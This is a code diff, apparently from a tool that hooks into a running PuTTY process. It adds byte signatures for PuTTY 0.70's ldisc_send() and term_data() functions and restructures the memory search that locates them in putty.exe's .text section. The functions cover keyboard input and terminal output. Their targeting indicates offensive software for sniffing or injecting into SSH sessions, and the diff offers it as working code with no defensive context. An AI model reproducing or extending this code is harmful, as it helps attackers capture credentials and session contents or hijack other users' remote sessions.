@@ -21,9 +21,12 @@
  * The hex representation of signatures must have an even length 
  */
 #define LDISC_SEND_SIGN1    "515355568b742414578b7c242033ed3bfd896c2410"    /* Matches ldisc_send() in Putty 0.54 - 0.63  */
+#define LDISC_SEND_SIGN2    "5553575683EC0C8B7424208B7C2428833E00751768"    /* Matches ldisc_send() in Putty 0.70         */
+
 #define TERM_DATA_SIGN1     "56ff7424148b74240cff7424148d466050e8"          /* Matches term_data()  in Putty 0.54 - 0.56  */
 #define TERM_DATA_SIGN2     "56ff7424148b74240cff7424148d464c50e8"          /* Matches term_data()  in Putty 0.57         */
 #define TERM_DATA_SIGN3     "568b742408ff7424148d464cff74241450e8"          /* Matches term_data()  in Putty 0.58 - 0.63  */
+#define TERM_DATA_SIGN4     "568B7424088D4660FF742414FF74241450E8"          /* Matches term_data()  in Putty 0.70         */
 
 DWORD   pLdiscSend;             /* The address of ldisc_send() in .text section of Putty.exe */
 DWORD   pTermData;              /* The address of term_data()  in .text section of Putty.exe */
@@ -99,9 +102,16 @@ BOOL FindTargetFunctions(DWORD* pLdiscSend, DWORD* pTermData)
     }
     
     /* Find ldisc_send() address in .text section of Putty.exe */
-    HexStringToBytes(LDISC_SEND_SIGN1, buffer);    
+    HexStringToBytes(LDISC_SEND_SIGN1, buffer);
     *pLdiscSend = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                 (const unsigned char*)buffer, strlen(LDISC_SEND_SIGN1) / 2);
+
+    if (*pLdiscSend == 0) {
+        HexStringToBytes(LDISC_SEND_SIGN2, buffer);
+        *pLdiscSend = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
+                                (const unsigned char*)buffer, strlen(LDISC_SEND_SIGN2) / 2);
+    }
+
     if (*pLdiscSend == 0) {
         sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find ldisc_send()\n");
         WritePipeMessage(logPipe, buffer);
@@ -117,16 +127,24 @@ BOOL FindTargetFunctions(DWORD* pLdiscSend, DWORD* pTermData)
         HexStringToBytes(TERM_DATA_SIGN2, buffer);    
         *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                     (const unsigned char*)buffer, strlen(TERM_DATA_SIGN2) / 2);
-        if (*pTermData == 0) {
-            HexStringToBytes(TERM_DATA_SIGN3, buffer);    
-            *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
-                                        (const unsigned char*)buffer, strlen(TERM_DATA_SIGN3) / 2);
-            if (*pTermData == 0) {
-                sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find term_data()\n");
-                WritePipeMessage(logPipe, buffer);
-                return FALSE;
-            }
-        }
+    }
+
+    if (*pTermData == 0) {
+        HexStringToBytes(TERM_DATA_SIGN3, buffer);    
+        *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
+                                    (const unsigned char*)buffer, strlen(TERM_DATA_SIGN3) / 2);
+    }
+
+    if (*pTermData == 0) {
+        HexStringToBytes(TERM_DATA_SIGN4, buffer);    
+        *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
+                                    (const unsigned char*)buffer, strlen(TERM_DATA_SIGN4) / 2);
+    }
+
+    if (*pTermData == 0) {
+        sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find term_data()\n");
+        WritePipeMessage(logPipe, buffer);
+        return FALSE;
     }
     
     return TRUE;
